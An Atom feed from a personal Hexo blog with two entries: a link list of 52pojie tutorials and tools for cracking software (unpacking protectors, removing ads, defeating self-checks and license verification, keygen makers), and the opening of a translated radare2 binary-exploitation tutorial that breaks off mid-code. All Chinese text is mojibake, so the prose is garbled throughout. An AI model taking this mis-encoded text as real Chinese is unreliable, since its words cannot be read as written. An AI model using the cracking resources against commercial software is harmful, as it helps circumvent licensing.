<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AssassinQ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://qianfei11.github.io/"/>
  <updated>2019-02-03T09:49:51.004Z</updated>
  <id>https://qianfei11.github.io/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>é—­å…³å­¦ä¹ </title>
    <link href="https://qianfei11.github.io/2099/12/31/%E9%97%AD%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
    <id>https://qianfei11.github.io/2099/12/31/é—­å…³å­¦ä¹ /</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2019-02-03T09:49:51.004Z</updated>
    
    <content type="html"><![CDATA[<p>(Â´ï½¥_ï½¥`)</p><a id="more"></a><p>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬ä¸€è¯¾ï¼šç ´è§£åŸºç¡€çŸ¥è¯†ä¹‹ä»‹ç»å¸¸è§å·¥å…·å’Œå£³çš„ç‰¹å¾ã€‹ è®²å¸ˆï¼šHmilyï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-378612-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-378612-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬äºŒè¯¾ï¼šå®æˆ˜å»å¹¿å‘Šã€å¼¹çª—åŠä¸»é¡µé”å®šã€‹ è®²å¸ˆï¼šKidoï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-384195-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-384195-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬ä¸‰è¯¾ï¼šæ”¹å¤´æ¢é¢ä¹‹ä¿®æ”¹ç‰ˆæƒå’Œèµ„æºã€‹ è®²å¸ˆï¼šKidoï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-389996-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-389996-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬å››è¯¾ï¼šå‡»ç ´ç¨‹åºæœ€åšå›ºçš„å ¡å’â€“å®æˆ˜å»ç¨‹åºè‡ªæ ¡éªŒã€‹ è®²å¸ˆï¼šå°ç”Ÿæˆ‘æ€•æ€•ï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-392395-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-392395-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬äº”è¯¾ï¼šåå‡»ä½œè€…çš„æŒ‘è¡…â€“å®æˆ˜è§£é™¤ç¨‹åºé‡å¯éªŒè¯ã€‹ è®²å¸ˆï¼šæˆ‘æ˜¯ç”¨æˆ·ï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-396068-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-396068-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬å…­è¯¾ï¼šæ½œä¼åœ¨ç¨‹åºèº«è¾¹çš„é»‘å½±â€“å®æˆ˜ç»™ç¨‹åºè¡¥ä¸ã€‹ è®²å¸ˆï¼šæˆ‘æ˜¯ç”¨æˆ·ï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-405758-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-405758-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬ä¸ƒè¯¾ï¼šæ‰‹æŠŠæ‰‹æ•™ä½ ä»å®ä¾‹çœ‹å¦‚ä½•æ”»ç ´å¸¸è§çš„ç½‘ç»œéªŒè¯ã€‹ è®²å¸ˆï¼šçˆè“å¤œé›¨ï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-408475-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-408475-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬å…«è¯¾ï¼šçŸ­å…µç›¸æ¥â€“æ·±å…¥æµ…å‡ºæ¢è®¨è„±å£³ç»†èŠ‚ï¼ˆä¸Šï¼‰ã€‹ è®²å¸ˆï¼šL4Nceï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-411104-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-411104-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬ä¹è¯¾ï¼šçŸ­å…µç›¸æ¥â€“æ·±å…¥æµ…å‡ºæ¢è®¨è„±å£³ç»†èŠ‚ï¼ˆä¸‹ï¼‰ã€‹ è®²å¸ˆï¼šL4Nceï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-411104-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-411104-1-1.html</a><br>ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬åè¯¾ï¼šæ¢å¯»é€†å‘æ–°èˆªæ ‡â€”x64å¹³å°è„±å£³ä¸ç ´è§£å®æˆ˜ã€‹ è®²å¸ˆï¼šKidoï¼Œé“¾æ¥ï¼š<a href="http://www.52pojie.cn/thread-422192-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-422192-1-1.html</a></p><p>å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œä¸‹é¢æ˜¯ç ´è§£éœ€è¦ç”¨åˆ°çš„å·¥å…·<br>OllyDbg(OD)ï¼š<a href="http://www.52pojie.cn/thread-350397-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-350397-1-1.html</a><br>PEIDï¼š<a href="http://www.52pojie.cn/thread-170387-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-170387-1-1.html</a><br>Exeinfo PEï¼š<a href="http://www.52pojie.cn/thread-169779-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-169779-1-1.html</a><br>æ¨±èŠ±è¡¥ä¸åˆ¶ä½œå·¥å…·ï¼š<a href="http://www.52pojie.cn/thread-62307-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-62307-1-1.html</a><br>å†…å­˜è¡¥ä¸ç”Ÿæˆå™¨ï¼š<a href="http://www.52pojie.cn/thread-162411-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-162411-1-1.html</a><br>æ³¨å†Œæœºç”Ÿæˆå™¨ï¼š<a href="http://www.52pojie.cn/thread-159470-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-159470-1-1.html</a><br>IDA Pro v6.5ï¼š<a href="http://www.52pojie.cn/thread-284145-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-284145-1-1.html</a><br>ç ´è§£å·¥å…·åŒ…ï¼š<a href="http://www.52pojie.cn/thread-190698-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-190698-1-1.html</a><br>å¾çˆ±äº‘ç›˜ã€æœ€ç‰›é€¼çš„åœ¨çº¿å·¥å…·åŒ…ã€‘ï¼š<a href="http://down.52pojie.cn/Tools/" target="_blank" rel="noopener">http://down.52pojie.cn/Tools/</a></p><p>NO.1<br>Hmily ã€åˆå­¦è€…æ•™ç¨‹ã€‘ç ´è§£åŸºç¡€çŸ¥è¯†ä¹‹è®¤è¯†å£³ä¸ç¨‹åºçš„ç‰¹å¾ã€‚<br>æ–°æ‰‹ä¸€çœ‹æ•™ç¨‹å°±åœ¨è¯´ç¨‹åºç ´è§£åº”è¯¥å…ˆè„±å£³ï¼Œé‚£åˆ°åº•ç¨‹åºæœ‰æ²¡æœ‰åŠ å£³ï¼ŸåŠ äº†ä»€ä¹ˆå£³ï¼Ÿçœ‹çœ‹å¤§Hçš„æ–‡ç« ä½ å°±æ‡‚äº†ï¼<br><a href="http://www.52pojie.cn/thread-234739-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-234739-1-1.html</a></p><p>NO.2<br>ximo è„±å£³æ•™ç¨‹(24é›†å…¨)<br><a href="http://pan.baidu.com/s/1cebVOU" target="_blank" rel="noopener">http://pan.baidu.com/s/1cebVOU</a> å¯†ç : fxia<br><a href="http://down.52pojie.cn/å¾çˆ±ç ´è§£è§†é¢‘æ•™ç¨‹/ximoè„±å£³åŸºç¡€.7z" target="_blank" rel="noopener">http://down.52pojie.cn/å¾çˆ±ç ´è§£è§†é¢‘æ•™ç¨‹/ximoè„±å£³åŸºç¡€.7z</a><br>æ¥è‡ªå¾çˆ±ç ´è§£è®ºå›LCGç»„ç»‡æˆå‘˜ä¹Ÿæ˜¯VMPè„±å£³æ’ä»¶ä½œè€…ximoåšçš„è„±å£³æ•™ç¨‹ï¼Œå ªç§°ç»å…¸ï¼Œå…¥é—¨è„±å£³å¿…å­¦ï¼<br>å‹ç¼©åŒ…ä¸º7Zæ ¼å¼ï¼Œ7Zå®˜æ–¹ç½‘ç«™</p><p>NO.3<br>å°ç”Ÿæˆ‘æ€•æ€• è„±å£³ç»ƒä¹ ç³»åˆ—é™„å¸¦å¯¹åº”æ–‡ç« çš„åŠ¨ç”»è§†é¢‘æ•™ç¨‹ï¼Œæ–¹ä¾¿å­¦ä¹ äº¤æµè„±å£³çŸ¥è¯†ã€‚<br>æ•™ç¨‹å¯¹åº”åŠ¨ç”»è§†é¢‘ï¼š<a href="http://www.52pojie.cn/thread-11642-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11642-1-1.html</a></p><p>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ ä¸€â€”-å‹ç¼©å£³ç»ƒä¹ ä¹‹ä¸€:<a href="http://www.52pojie.cn/thread-10496-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10496-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äºŒâ€”-å‹ç¼©å£³ç»ƒä¹ ä¹‹äºŒ:<a href="http://www.52pojie.cn/thread-10607-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10607-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ ä¸‰â€”-å‹ç¼©å£³ç»ƒä¹ ä¹‹ä¸‰:<a href="http://www.52pojie.cn/thread-10688-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10688-1-1.html</a><br>å¾çˆ±ç ´è§£è„±å£³ç»ƒä¹ å››â€”â€”ç®€å•åŠ å¯†å£³:<a href="http://www.52pojie.cn/thread-10850-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10850-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äº”â€”-upxå£³:<a href="http://www.52pojie.cn/thread-10990-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10990-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ å…­â€”-TElock V0.99 :<a href="http://www.52pojie.cn/thread-11112-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11112-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ ä¸ƒâ€”-ORiEN:<a href="http://www.52pojie.cn/thread-11244-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11244-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ å…«â€”-MoleBox V2.6.5:<a href="http://www.52pojie.cn/thread-11306-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11306-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ ä¹â€”-CRYPToCRACkâ€™s PE Protector:<a href="http://www.52pojie.cn/thread-11446-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11446-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åâ€”-PESpin 1.32ï¼š<a href="http://www.52pojie.cn/thread-11585-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11585-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åä¸€â€”-VBè‡ªæ•ˆéªŒçš„å¤„ç†:<a href="http://www.52pojie.cn/thread-11747-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11747-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åäºŒâ€”-delphiè‡ªæ•ˆéªŒçš„å¤„ç†:<a href="http://www.52pojie.cn/thread-11883-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11883-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åä¸‰â€”-GHF Protector V1.0:<a href="http://www.52pojie.cn/thread-12011-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12011-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åå››â€”-Armadillo 6.04ï¼š<a href="http://www.52pojie.cn/thread-12135-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12135-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åäº”â€”-ACProtectorç³»åˆ—ä¿æŠ¤ï¼š<a href="http://www.52pojie.cn/thread-12279-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12279-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åå…­â€”-ACProtectorç³»åˆ—ä¿æŠ¤ï¼š<a href="http://www.52pojie.cn/thread-12362-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12362-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åä¸ƒâ€”-PEBundle 2.0b5 - 3.0xï¼š<a href="http://www.52pojie.cn/thread-12498-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12498-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åå…«â€”-Armadillo 4.40ï¼š<a href="http://www.52pojie.cn/thread-12620-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12620-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åä¹â€”-PUNiSHER 1.5ï¼š<a href="http://www.52pojie.cn/thread-12822-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12822-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äºŒåâ€”-æœªçŸ¥å£³ä¸€ï¼š<a href="http://www.52pojie.cn/thread-12936-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12936-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äºŒåä¸€â€”-æœªçŸ¥å£³äºŒï¼š<a href="http://www.52pojie.cn/thread-13494-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-13494-1-1.html</a><br>å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äºŒåäºŒâ€”-æœªçŸ¥å£³ä¸‰ï¼š<a href="http://www.52pojie.cn/thread-13770-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-13770-1-1.html</a></p><p>NO.4<br>æˆ‘æ˜¯ç”¨æˆ· ç ´è§£å®æˆ˜(10é›†å…¨)<br>ç ´è§£å®æˆ˜æ¼”ç»ƒæ•™ç¨‹<br>ç¬¬ä¸€æˆ˜:<a href="http://www.52pojie.cn/thread-197281-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-197281-1-1.html</a><br>ç¬¬äºŒæˆ˜:<a href="http://www.52pojie.cn/thread-197598-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-197598-1-1.html</a><br>ç¬¬ä¸‰æˆ˜:<a href="http://www.52pojie.cn/thread-197957-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-197957-1-1.html</a><br>ç¬¬å››æˆ˜:<a href="http://www.52pojie.cn/thread-198203-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-198203-1-1.html</a><br>ç¬¬äº”æˆ˜:<a href="http://www.52pojie.cn/thread-198365-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-198365-1-1.html</a><br>ç¬¬å…­æˆ˜:<a href="http://www.52pojie.cn/thread-198930-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-198930-1-1.html</a><br>ç¬¬ä¸ƒæˆ˜:<a href="http://www.52pojie.cn/thread-199459-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-199459-1-1.html</a><br>ç¬¬å…«æˆ˜:<a href="http://www.52pojie.cn/thread-199834-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-199834-1-1.html</a><br>ç¬¬ä¹æˆ˜:<a href="http://www.52pojie.cn/thread-200655-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-200655-1-1.html</a><br>ç¬¬åæˆ˜:<a href="http://www.52pojie.cn/thread-200798-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-200798-1-1.html</a></p><p>NO.5<br>Blue .NETç³»åˆ—æ•™ç¨‹(4é›†å…¨)<br>å›¾æ–‡æ•™ç¨‹åˆ†æ.netç¨‹åºï¼<br>ç¬¬ä¸€è¯¾ <a href="http://www.52pojie.cn/thread-248348-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-248348-1-1.html</a><br>ç¬¬äºŒè¯¾ <a href="http://www.52pojie.cn/thread-249034-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-249034-1-1.html</a><br>ç¬¬ä¸‰è¯¾ <a href="http://www.52pojie.cn/thread-250626-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-250626-1-1.html</a><br>ç¬¬å››è¯¾ <a href="http://www.52pojie.cn/thread-250633-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-250633-1-1.html</a></p><p>NO.6<br>å»è½¯ä»¶å¼¹çª—ç³»åˆ—æ•™ç¨‹(å…±ä¸¤é›†)<br>ç¬¬ä¸€è¯¾ <a href="http://www.52pojie.cn/thread-316180-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-316180-1-1.html</a><br>ç¬¬äºŒè¯¾ <a href="http://www.52pojie.cn/thread-323346-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-323346-1-1.html</a></p><p>NO.7<br>R4ndomç ´è§£æ•™ç¨‹å…¨æ–‡ç¿»è¯‘(å…±ä¸ƒé›†)<br>ç¬¬ä¸€è¯¾ <a href="http://www.52pojie.cn/thread-344925-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-344925-1-1.html</a><br>ç¬¬äºŒè¯¾ <a href="http://www.52pojie.cn/thread-345839-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-345839-1-1.html</a><br>ç¬¬ä¸‰è¯¾ <a href="http://www.52pojie.cn/thread-346455-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-346455-1-1.html</a><br>ç¬¬å››è¯¾ <a href="http://www.52pojie.cn/thread-350727-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-350727-1-1.html</a><br>ç¬¬äº”è¯¾ <a href="http://www.52pojie.cn/thread-352818-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-352818-1-1.html</a><br>ç¬¬å…­è¯¾ <a href="http://www.52pojie.cn/thread-354029-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-354029-1-1.html</a><br>ç¬¬ä¸ƒè¯¾ <a href="http://www.52pojie.cn/thread-355207-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-355207-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;(Â´ï½¥_ï½¥`)&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Radare2ä¹‹æ—…-Part2ï¼šExploitation</title>
    <link href="https://qianfei11.github.io/2019/02/23/Radare2%E4%B9%8B%E6%97%85-Part2%EF%BC%9AExploitation/"/>
    <id>https://qianfei11.github.io/2019/02/23/Radare2ä¹‹æ—…-Part2ï¼šExploitation/</id>
    <published>2019-02-23T03:18:10.000Z</published>
    <updated>2019-02-24T13:38:55.723Z</updated>
    
    <content type="html"><![CDATA[<p>ç¿»è¯‘è‡ª<a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">Megabeets</a>ã€‚</p><a id="more"></a><h1 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h1><p>æ¬¢è¿æ¥åˆ°æˆ‘ä»¬<code>radare2</code>ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†ï¼åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¼šæ¶µç›–<code>radare2</code>çš„æ›´å¤šéƒ¨åˆ†ï¼ŒåŒæ—¶è¿™æ¬¡æ›´æ³¨é‡äºäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ã€‚</p><p>ç›¸ä¿¡å¤§å®¶éƒ½ä¸€å®šå¾ˆæœŸå¾…è¿™ç¬¬äºŒéƒ¨åˆ†ï¼Œä¹‹åçš„å†…å®¹ä¹Ÿä¸€å®šä¼šæ›´å¿«åœ°åˆ†äº«ç»™å¤§å®¶ã€‚å¦‚æœä½ è¿˜æ²¡æœ‰é˜…è¯»è¿‡è¿™ä¸€ç³»åˆ—çš„<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">ç¬¬ä¸€éƒ¨åˆ†</a>ï¼Œæˆ‘éå¸¸æ¨èä½ å»è¯»ä¸€è¯»ã€‚ç¬¬ä¸€éƒ¨åˆ†è®°å½•äº†<code>radare2</code>çš„åŸºç¡€å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿè§£é‡Šäº†å¾ˆå¤šæˆ‘ä»Šå¤©ä¼šç”¨åˆ°çš„å‘½ä»¤ã€‚</p><p>åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯å¯¹ä¸€ä¸ªç®€å•çš„ç¨‹åºè¿›è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ã€‚<code>radare2</code>æœ‰å¾ˆå¤šä¸åŒçš„åŠŸèƒ½å¯ä»¥å¸®æˆ‘ä»¬å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä¾‹å¦‚ä¿æŠ¤æŠ€æœ¯ã€æŸ¥æ‰¾ROPã€ç”Ÿæˆéšæœºåºåˆ—ã€æŸ¥çœ‹å¯„å­˜å™¨å†…å®¹ç­‰ç­‰ã€‚ä½ å¯ä»¥åœ¨æœ¬æ–‡æœ«å°¾æ‰¾åˆ°ä¸€ä»½å‘½ä»¤å¯¹åº”è¡¨ã€‚ä»Šå¤©æˆ‘ä¼šå‘ä½ ä»¬å±•ç¤ºè¿™äº›å¼ºå¤§çš„åŠŸèƒ½ï¼ŒåŒæ—¶æˆ‘ä»¬ç”¨<code>radare2</code>æ¥ç»•è¿‡åœ¨å¼€å¯<code>ASLR</code>çš„ç³»ç»Ÿä¸Šè¿è¡Œå¹¶ä¸”æœ‰<code>NX</code>ä¿æŠ¤çš„ç¨‹åºã€‚æˆ‘å‡è®¾å¤§å®¶éƒ½å·²ç»æŒæ¡äº†ä»¥ä¸‹çš„é¢„å¤‡çŸ¥è¯†ï¼š</p><ul><li>æ±‡ç¼–è¯­è¨€</li><li>ç¨‹åºä¿æŠ¤æŠ€æœ¯ï¼ˆ<code>NX</code>ã€<code>ASLR</code>ï¼‰</li><li><a href="https://en.wikipedia.org/wiki/Call_stack" target="_blank" rel="noopener">æ ˆå¸§ç»“æ„</a></li><li><a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">ç¼“å†²åŒºæº¢å‡º</a></li><li><a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">é¢å‘è¿”å›ç¼–ç¨‹</a></li><li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="noopener">x86è°ƒç”¨çº¦å®š</a></li></ul><p>ç†Ÿæ‚‰è¿™äº›çŸ¥è¯†æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œå› ä¸ºæ–‡ç« ä¸­æˆ‘å¹¶ä¸ä¼šç»†è®²ï¼Œç”šè‡³ä¸ä¼šå¯¹å…¶è§£é‡Šã€‚</p><p><img src="https://www.megabeets.net/uploads/r2_part1_2.png" alt></p><h1 id="æ›´æ–°radare2"><a href="#æ›´æ–°radare2" class="headerlink" title="æ›´æ–°radare2"></a>æ›´æ–°<code>radare2</code></h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬å°†<code>radare2</code>æ›´æ–°è‡³å…¶gitçš„æœ€æ–°ç‰ˆç‰ˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://github.com/radare/radare2.git # å¦‚æœä½ è¿˜æ²¡æœ‰å…‹éš†ä¸‹æ¥çš„è¯</span><br><span class="line"><span class="meta">$</span> cd radare2</span><br><span class="line"><span class="meta">$</span> ./sys/install.sh</span><br></pre></td></tr></table></figure><p>ç­‰å¾…æ›´æ–°å®Œæˆéœ€è¦å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œåœ¨è¿™æœŸé—´ä¸å¦‚çœ‹äº›è§†é¢‘æ”¾æ¾ä¸€ä¼šå„¿ã€‚</p><h1 id="ç†Ÿæ‚‰ç¨‹åº"><a href="#ç†Ÿæ‚‰ç¨‹åº" class="headerlink" title="ç†Ÿæ‚‰ç¨‹åº"></a>ç†Ÿæ‚‰ç¨‹åº</h1><p>ä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2" target="_blank" rel="noopener">ç¨‹åº</a>ï¼Œåœ¨è¿™é‡Œä¸‹è½½<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c" target="_blank" rel="noopener">æºç </a>ã€‚<br>å¦‚æœä½ æƒ³è‡ªå·±ç¼–è¯‘ç¨‹åºï¼Œç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡çš„ç¨‹åºä¸ä¸Šä¸€æ¬¡çš„ç¨‹åºéå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯åœ¨<code>main()</code>å‡½æ•°ä¸­æœ‰ä¸€äº›ç»†å¾®çš„æ”¹å˜ï¼š</p><ul><li>ç¼–è¯‘æ—¶ä¸ä½¿ç”¨å‚æ•°<code>-z execstac</code>æ¥å¼€å¯<code>NX</code></li><li>é€šè¿‡scanfæ¥æ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯é€šè¿‡ç¨‹åºçš„å‚æ•°</li><li>å¤§éƒ¨åˆ†è¾“å‡ºçš„å‡½æ•°ä¸ºputs</li><li>å¯¹ç¨‹åºçš„è¾“å‡ºåšäº†ä¸€ç‚¹ä¿®æ”¹</li></ul><p>è¿™æ˜¯ä¹‹å‰çš„<code>main()</code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n  .:: Megabeets ::.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Think you can make it?\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">2</span> &amp;&amp; beet(argv[<span class="number">1</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success!\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nop, Wrong argument.\n\n"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç°åœ¨çš„<code>main</code>å‡½æ•°æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 